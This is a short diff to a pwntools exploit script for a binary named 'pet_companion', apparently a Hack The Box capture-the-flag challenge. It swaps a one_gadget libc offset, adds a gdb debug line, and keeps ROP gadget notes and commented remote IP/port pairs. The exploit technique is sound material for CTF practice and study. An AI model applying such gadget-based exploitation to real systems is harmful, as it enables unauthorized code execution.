@@ -23,8 +23,8 @@ padding = offset*b'A'
 #ip, port='161.35.168.118', 30070
 #ip, port = '94.237.59.34', 59604   #HTB
 #io = remote(ip,port)
-#io = process('./pet_companion')
 io = process('./pet_companion')
+#io = gdb.debug('./pet_companion','break main')
 
 #0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
 #0x004005e8: add [rbp-0x3d], ebx; nop [rax+rax]; rep ret;
@@ -64,10 +64,10 @@ constraints:
 constraints:
   [rsp+0x70] == NULL
 
-
 '''
 
-one_gadget = 0x4f2a5
+one_gadget = 0x10a2fc
+
 offset = one_gadget - libc.sym['read']
 
 offset = 2**32 + offset
